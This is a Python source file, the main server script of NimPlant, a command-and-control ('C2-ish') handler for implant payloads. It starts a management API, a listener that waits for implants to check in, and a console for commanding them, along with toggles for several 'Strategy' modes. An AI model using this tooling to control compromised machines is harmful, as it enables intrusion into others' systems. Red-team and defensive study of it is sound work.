#!/usr/bin/python3

# -----
#
#   NimPlant Server - The "C2-ish"™ handler for the NimPlant payload
#   By Cas van Cooten (@chvancooten)
#
# -----

import threading
import time

from .api.server import api_server, server_ip, server_port
from .util.db import initDb, dbInitNewServer, dbPreviousServerSameConfig
from .util.func import nimplantPrint, periodicNimplantChecks
from .util.listener import *
from .util.nimplant import *
from .util.input import *


def main(xor_key=459457925, name=""):
    # Initialize the SQLite database
    initDb()

    # Restore the previous server session if config remains unchanged
    # Otherwise, initialize a new server session
    if dbPreviousServerSameConfig(np_server, xor_key):
        nimplantPrint("Existing server session found, restoring...")
        np_server.restoreServerFromDb()
    else:
        np_server.initNewServer(name, xor_key)
        dbInitNewServer(np_server)

    # Start daemonized Flask server for API communications
    t1 = threading.Thread(name="Listener", target=api_server)
    t1.setDaemon(True)
    t1.start()
    nimplantPrint(f"Started management server on http://{server_ip}:{server_port}.")

    # Start another thread for NimPlant listener
    t2 = threading.Thread(name="Listener", target=flaskListener, args=(xor_key,))
    t2.setDaemon(True)
    t2.start()
    nimplantPrint(
        f"Started NimPlant listener on {listenerType.lower()}://{listenerIp}:{listenerPort}. CTRL-C to cancel waiting for NimPlants."
    )

    # Start another thread to periodically check if nimplants checked in on time
    t3 = threading.Thread(name="Listener", target=periodicNimplantChecks)
    t3.setDaemon(True)
    t3.start()

    # Run the console as the main thread
    while True:
        try:
            userInput = input()

            if np_server.isActiveNimplantSelected():
                promptUserForCommand()

            # This was commented out such that it is possible to activate/deactivate Strategies in the command line
            # Otherwise Nimplants would be automatically selected in the command line and then no Strategies can be commanded
            # elif np_server.containsActiveNimplants():
                # np_server.selectNextActiveNimplant()

            elif userInput == "Strategy One":
                np_server.strategyOneEnabled = not np_server.strategyOneEnabled
                print("Strategy 1 enabled: " + str(np_server.strategyOneEnabled))

            elif userInput == "Strategy Two":
                np_server.strategyTwoEnabled = not np_server.strategyTwoEnabled
                print("Strategy 2 enabled: " + str(np_server.strategyTwoEnabled))

            elif userInput == "Strategy Four":
                np_server.strategyFourEnabled = not np_server.strategyFourEnabled
                print("Strategy 4 enabled: " + str(np_server.strategyFourEnabled))

            elif userInput == "Strategy Five":
                np_server.strategyFiveEnabled = not np_server.strategyFiveEnabled
                print("Strategy 5 enabled: " + str(np_server.strategyFiveEnabled))

            else:
                pass

            time.sleep(0.5)

        except KeyboardInterrupt:
            exitServerConsole()
